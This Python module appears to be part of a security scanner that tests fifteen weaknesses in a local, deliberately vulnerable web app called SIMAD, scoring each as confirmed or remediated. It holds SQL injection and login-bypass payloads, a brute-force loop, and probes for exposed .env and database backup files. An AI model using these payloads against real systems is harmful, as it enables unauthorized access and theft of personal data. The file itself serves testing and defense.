"""redcheck/checks/legacy_simad.py — A1–A15 checks against SIMAD (http://localhost:8080).

Each check_AX() function receives an httpx.Client and a Scoreboard,
performs the minimal probe, and returns a Finding.

Convention:
  - vuln mode  → status="fail"  (weakness confirmed)
  - hardened   → status="pass"  (weakness remediated)
  - unreachable → status="skip" + note
"""
from __future__ import annotations

import re
import uuid
from typing import Optional

import httpx

from ..schema import Finding, Severity
from ..pii import Scoreboard
from ..accounts import by_role

BASE = ""  # injected at call time via client.base_url


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _snippet(text: str, length: int = 200) -> str:
    return text[:length].replace("\n", " ").replace("\r", "")


def _body(r: httpx.Response) -> str:
    try:
        return r.text
    except Exception:
        return ""


def _status_check(
    ok: bool, id: str, category: str, severity: Severity, endpoint: str,
    evidence: str = "", note: str = "", leaked: Optional[list[str]] = None,
    rows: int = 0,
) -> Finding:
    return Finding(
        id=id,
        category=category,
        severity=severity,
        endpoint=endpoint,
        status="fail" if ok else "pass",
        evidence_snippet=evidence,
        note=note,
        leaked_fields=leaked or [],
        rows_exposed=rows,
    )


def _skip(id: str, category: str, severity: Severity, endpoint: str, reason: str) -> Finding:
    return Finding(
        id=id, category=category, severity=severity, endpoint=endpoint,
        status="skip", note=reason,
    )


# ---------------------------------------------------------------------------
# A1 — SQL injection (UNION/boolean/error) on direktori.php?q=
# ---------------------------------------------------------------------------
def check_A1(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A1"
    cat = "SQL Injection (UNION/boolean/error)"
    sev: Severity = "critical"
    ep  = "/direktori.php?q="

    # Probe 1: single-quote error-based
    try:
        r1 = client.get("/direktori.php", params={"q": "'"})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body1 = _body(r1)
    has_sql_error = bool(re.search(
        r"(SQL syntax|mysql_fetch|ORA-\d+|Warning.*mysql|Unclosed quotation|syntax error)",
        body1, re.IGNORECASE
    ))

    # Probe 2: boolean differential (true vs always-false)
    try:
        r_true  = client.get("/direktori.php", params={"q": "a' OR '1'='1"})
        r_false = client.get("/direktori.php", params={"q": "a' AND '1'='2"})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body_true  = _body(r_true)
    body_false = _body(r_false)

    # Boolean differential: true page has more rows
    row_true  = len(re.findall(r"<tr", body_true))
    row_false = len(re.findall(r"<tr", body_false))
    boolean_diff = row_true > row_false + 2

    # Scan PII from the injected response
    sb.scan_text(body_true)

    vuln = has_sql_error or boolean_diff
    evidence = ""
    if has_sql_error:
        # grab the error line
        m = re.search(r"(SQL syntax[^\n<]{0,150})", body1, re.IGNORECASE)
        evidence = m.group(1) if m else _snippet(body1, 120)
    elif boolean_diff:
        evidence = f"Boolean diff: OR rows={row_true} AND rows={row_false}"

    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A2 — SQL injection numerik + IDOR on anggota.php?id=
# ---------------------------------------------------------------------------
def check_A2(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A2"
    cat = "SQL Injection numerik + IDOR"
    sev: Severity = "critical"
    ep  = "/anggota.php?id="

    try:
        r_valid = client.get("/anggota.php", params={"id": "1"})
        r_inject = client.get("/anggota.php", params={"id": "1 OR 1=1"})
        r_alpha  = client.get("/anggota.php", params={"id": "abc"})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body_valid  = _body(r_valid)
    body_inject = _body(r_inject)
    body_alpha  = _body(r_alpha)

    # IDOR: valid non-auth request returns member data
    has_data = bool(re.search(r"(no_ktp|NIK|rekening|handphone|email)", body_valid, re.IGNORECASE))
    # numeric injection: alpha input not rejected with 400
    no_reject = r_alpha.status_code != 400
    # boolean: injection returns more data
    rows_valid  = len(re.findall(r"<tr", body_valid))
    rows_inject = len(re.findall(r"<tr", body_inject))
    bool_diff = rows_inject > rows_valid + 1

    sb.scan_text(body_inject)
    sb.scan_text(body_valid)

    vuln = has_data or no_reject or bool_diff
    evidence = f"id=1 has_data={has_data}, no_reject_alpha={no_reject}, bool_diff={bool_diff}"
    leaked = []
    if has_data:
        leaked = ["no_ktp", "rekening", "handphone", "email"]

    return _status_check(vuln, id_, cat, sev, ep, evidence, leaked=leaked)


# ---------------------------------------------------------------------------
# A3 — Auth bypass via SQLi on login.php
# ---------------------------------------------------------------------------
def check_A3(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A3"
    cat = "Auth bypass SQLi (MD5 tanpa salt)"
    sev: Severity = "critical"
    ep  = "/login.php"

    payload_user = "admin' OR '1'='1' --"
    payload_pass = "anything"

    try:
        r = client.post("/login.php", data={"username": payload_user, "password": payload_pass})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body = _body(r)
    # Bypass: redirect to dashboard, OR SQL error in body (payload reached DB), OR no login error
    redirected = r.url.path not in ("/login.php", "/login")
    has_sql_error = bool(re.search(r"(SQL syntax|mysql_fetch|MySQL Error)", body, re.IGNORECASE))
    no_error = not bool(re.search(r"(kata sandi salah|tidak terdaftar|gagal|invalid)", body, re.IGNORECASE))
    dashboard = bool(re.search(r"(dashboard|selamat datang|logout|keluar)", body, re.IGNORECASE))

    # A 500 with SQL error means the payload reached the query — that's the vuln
    vuln = redirected or has_sql_error or (no_error and dashboard)
    evidence = f"status={r.status_code} url={r.url} sql_error={has_sql_error} dashboard={dashboard}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A4 — Username enumeration via distinct error messages
# ---------------------------------------------------------------------------
def check_A4(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A4"
    cat = "Enumerasi username"
    sev: Severity = "medium"
    ep  = "/login.php"

    try:
        r_known   = client.post("/login.php", data={"username": "admin",          "password": "wrong"})
        r_unknown = client.post("/login.php", data={"username": "user_nonexist_x", "password": "wrong"})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    b_known   = _body(r_known).lower()
    b_unknown = _body(r_unknown).lower()

    # Different messages → enumerable
    diff = b_known != b_unknown
    evidence = ""
    if diff:
        known_snippet   = b_known[:80]
        unknown_snippet = b_unknown[:80]
        evidence = f"known='{known_snippet}' unknown='{unknown_snippet}'"

    return _status_check(diff, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A5 — Brute force (no rate limiting on login)
# ---------------------------------------------------------------------------
def check_A5(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A5"
    cat = "Brute force (tanpa batas)"
    sev: Severity = "high"
    ep  = "/login.php"

    attempts = 6
    blocked = False
    try:
        for i in range(attempts):
            r = client.post("/login.php", data={"username": "admin", "password": f"wrong{i}"})
            if r.status_code in (429, 403):
                blocked = True
                break
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    evidence = f"Sent {attempts} attempts, blocked={blocked}"
    # vuln = NOT blocked
    return _status_check(not blocked, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A6 — Over-exposure: hidden UI fields sent in HTML
# ---------------------------------------------------------------------------
def check_A6(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A6"
    cat = "Data disembunyikan di UI tapi terkirim"
    sev: Severity = "high"
    ep  = "/anggota.php"

    try:
        r = client.get("/anggota.php")
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body = _body(r)
    # Look for class="sembunyi" or <!-- debug record --> patterns containing PII
    hidden_div = bool(re.search(r'class=["\']sembunyi["\']', body, re.IGNORECASE))
    debug_comment = bool(re.search(r'<!--\s*debug record\s*-->', body, re.IGNORECASE))
    data_record = bool(re.search(r'data-record=', body, re.IGNORECASE))

    # Also check direktori.php
    try:
        rd = client.get("/direktori.php")
        body_d = _body(rd)
        data_record = data_record or bool(re.search(r'data-record=', body_d, re.IGNORECASE))
    except Exception:
        pass

    sb.scan_text(body)
    vuln = hidden_div or debug_comment or data_record
    evidence = f"sembunyi={hidden_div} debug_comment={debug_comment} data-record={data_record}"
    leaked = ["no_ktp", "rekening", "handphone"] if vuln else []
    return _status_check(vuln, id_, cat, sev, ep, evidence, leaked=leaked)


# ---------------------------------------------------------------------------
# A7 — Broken function-level auth on keuangan.php
# ---------------------------------------------------------------------------
def check_A7(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A7"
    cat = "Broken function-level auth (keuangan.php)"
    sev: Severity = "high"
    ep  = "/keuangan.php"

    # Try accessing without login
    try:
        r_anon = client.get("/keuangan.php")
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body_anon = _body(r_anon)
    anon_access = r_anon.status_code == 200 and bool(
        re.search(r"(rekening|keuangan|tabel|anggaran)", body_anon, re.IGNORECASE)
    )

    # Try as humas (should be 403)
    cookies: dict[str, str] = {}
    try:
        acc = by_role("humas")
        lr = client.post("/login.php", data={"username": acc.username, "password": acc.password})
        cookies = dict(lr.cookies)
        r_humas = client.get("/keuangan.php", cookies=cookies)
        humas_access = r_humas.status_code == 200 and bool(
            re.search(r"(rekening|keuangan)", _body(r_humas), re.IGNORECASE)
        )
    except Exception:
        humas_access = False

    vuln = anon_access or humas_access
    evidence = f"anon={anon_access} humas={humas_access}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A8 — Export without auth
# ---------------------------------------------------------------------------
def check_A8(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A8"
    cat = "Ekspor tanpa autentikasi"
    sev: Severity = "critical"
    ep  = "/export.php"

    try:
        r = client.get("/export.php")
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body = _body(r)
    is_csv  = "text/csv" in r.headers.get("content-type", "").lower()
    has_pii = bool(re.search(r"(no_ktp|rekening|npwp|handphone)", body, re.IGNORECASE))
    rows = len(body.splitlines()) - 1 if is_csv else 0

    sb.scan_text(body)

    vuln = (r.status_code == 200) and (is_csv or has_pii)
    evidence = f"status={r.status_code} is_csv={is_csv} has_pii={has_pii} rows≈{rows}"
    leaked = ["no_ktp", "rekening", "npwp", "handphone", "email"] if vuln else []
    return _status_check(vuln, id_, cat, sev, ep, evidence, leaked=leaked, rows=rows)


# ---------------------------------------------------------------------------
# A9 — Sensitive files exposed
# ---------------------------------------------------------------------------
def check_A9(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A9"
    cat = "File sensitif di web root"
    sev: Severity = "critical"
    ep  = "/backup/, /.env, /robots.txt"

    found: list[str] = []
    try:
        paths = [
            "/backup/",
            "/backup/simad_backup_2026-10-28.sql",
            "/.env",
            "/robots.txt",
        ]
        for p in paths:
            r = client.get(p)
            if r.status_code == 200:
                body = _body(r)
                # backup dir listing or SQL dump
                if p.endswith(".sql") and ("CREATE TABLE" in body or "INSERT INTO" in body):
                    found.append(p)
                    sb.scan_text(body)
                elif p == "/.env" and ("DB_" in body or "PASSWORD" in body or "SECRET" in body):
                    found.append(p)
                elif p == "/backup/" and "Index of" in body:
                    found.append(p)
                elif p == "/robots.txt":
                    # robots.txt leaking sensitive paths
                    if bool(re.search(r"(backup|admin|export|config)", body, re.IGNORECASE)):
                        found.append(f"{p}[leaks-paths]")
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    vuln = len(found) > 0
    evidence = f"found={found}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A10 — Verbose errors
# ---------------------------------------------------------------------------
def check_A10(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A10"
    cat = "Error verbose (MySQL query exposed)"
    sev: Severity = "medium"
    ep  = "/direktori.php?q="

    try:
        r = client.get("/direktori.php", params={"q": "'"})
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    body = _body(r)
    has_query = bool(re.search(r"(SELECT|FROM|WHERE|mysql_fetch|Warning.*mysql)", body, re.IGNORECASE))
    vuln = has_query
    evidence = _snippet(body, 150) if has_query else ""
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A11 — Weak hash (MD5 without salt)
# ---------------------------------------------------------------------------
def check_A11(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A11"
    cat = "Hash lemah (MD5 tanpa salt)"
    sev: Severity = "high"
    ep  = "/backup/simad_backup_2026-10-28.sql, /admin dashboard"

    # Check backup SQL dump for MD5-looking hashes (32 hex chars)
    md5_pattern = re.compile(r"\b[0-9a-f]{32}\b")
    try:
        r = client.get("/backup/simad_backup_2026-10-28.sql")
        body = _body(r)
        hashes = md5_pattern.findall(body)
        # Check that admin dashboard shows MD5 hashes
        r2 = client.get("/admin/dashboard.php")
        body2 = _body(r2)
        hashes2 = md5_pattern.findall(body2)
        all_hashes = hashes + hashes2
    except Exception:
        # Try admin dashboard only
        try:
            r2 = client.get("/admin/")
            body2 = _body(r2)
            all_hashes = md5_pattern.findall(body2)
        except Exception as exc:
            return _skip(id_, cat, sev, ep, str(exc))

    vuln = len(all_hashes) > 0
    evidence = f"Found {len(all_hashes)} MD5-like hashes, sample={all_hashes[:2]}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A12 — Session cookie flags
# ---------------------------------------------------------------------------
def check_A12(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A12"
    cat = "Sesi: cookie tanpa HttpOnly/SameSite"
    sev: Severity = "medium"
    ep  = "/login.php"

    try:
        acc = by_role("admin")
        r = client.post("/login.php", data={"username": acc.username, "password": acc.password})
    except Exception as exc2:
        return _skip(id_, cat, sev, ep, str(exc2))

    # Collect Set-Cookie from the response AND from any redirect history
    all_sc: list[str] = [v for k, v in r.headers.multi_items() if k.lower() == "set-cookie"]
    for h in getattr(r, "history", []):
        all_sc += [v for k, v in h.headers.multi_items() if k.lower() == "set-cookie"]
    all_sc_str = " ".join(all_sc).lower()

    missing_httponly = "httponly" not in all_sc_str
    missing_samesite = "samesite" not in all_sc_str
    has_simadsessid  = "simadsessid" in all_sc_str

    vuln = has_simadsessid and (missing_httponly or missing_samesite)
    evidence = f"has_simadsessid={has_simadsessid} httponly={not missing_httponly} samesite={not missing_samesite} cookies={all_sc[:1]}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A13 — Security headers
# ---------------------------------------------------------------------------
def check_A13(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A13"
    cat = "Header keamanan hilang"
    sev: Severity = "medium"
    ep  = "/ (homepage)"

    try:
        r = client.get("/")
    except Exception as exc:
        return _skip(id_, cat, sev, ep, str(exc))

    headers = {k.lower(): v for k, v in r.headers.items()}
    missing = []
    required = [
        "content-security-policy",
        "x-frame-options",
        "x-content-type-options",
        "referrer-policy",
    ]
    for h in required:
        if h not in headers:
            missing.append(h)
    powered_by = "x-powered-by" in headers

    vuln = len(missing) >= 2 or powered_by
    evidence = f"missing={missing} x-powered-by={powered_by}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A14 — Excessive DB privileges (indirect: check via error messages or backup)
# ---------------------------------------------------------------------------
def check_A14(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A14"
    cat = "Hak DB berlebih (root)"
    sev: Severity = "medium"
    ep  = "/.env, /backup/*.sql"

    try:
        r_env = client.get("/.env")
        body_env = _body(r_env)
        root_in_env = "root" in body_env.lower() and "DB_USER" in body_env
    except Exception:
        root_in_env = False

    try:
        r_sql = client.get("/backup/simad_backup_2026-10-28.sql")
        body_sql = _body(r_sql)
        root_in_sql = bool(re.search(r"root@", body_sql, re.IGNORECASE))
    except Exception:
        root_in_sql = False

    vuln = root_in_env or root_in_sql
    evidence = f"root_in_env={root_in_env} root_in_sql={root_in_sql}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# A15 — No audit trail
# ---------------------------------------------------------------------------
def check_A15(client: httpx.Client, sb: Scoreboard) -> Finding:
    id_ = "A15"
    cat = "Tanpa audit trail"
    sev: Severity = "low"
    ep  = "/admin/audit_log, /direktori.php"

    try:
        r = client.get("/admin/audit_log.php")
        has_audit = r.status_code == 200 and "audit" in _body(r).lower()
    except Exception:
        has_audit = False

    # Also check admin dashboard for audit table
    try:
        r2 = client.get("/admin/")
        has_audit = has_audit or "audit" in _body(r2).lower()
    except Exception:
        pass

    # vuln = no audit found
    vuln = not has_audit
    evidence = f"audit_log_found={has_audit}"
    return _status_check(vuln, id_, cat, sev, ep, evidence)


# ---------------------------------------------------------------------------
# Public entrypoint
# ---------------------------------------------------------------------------

ALL_CHECKS = [
    check_A1, check_A2, check_A3, check_A4, check_A5,
    check_A6, check_A7, check_A8, check_A9, check_A10,
    check_A11, check_A12, check_A13, check_A14, check_A15,
]


def run_all(client: httpx.Client, sb: Scoreboard) -> list[Finding]:
    findings: list[Finding] = []
    for fn in ALL_CHECKS:
        try:
            f = fn(client, sb)
            print(f"  [{f.status.upper():4}] {f.id} {f.category}")
            findings.append(f)
        except SystemExit:
            raise
        except Exception as exc:
            fid = fn.__name__.replace("check_", "")
            print(f"  [ERR ] {fid} — {exc}")
            findings.append(Finding(
                id=fid, category="(error)", severity="info",
                endpoint="?", status="skip", note=str(exc),
            ))
    return findings
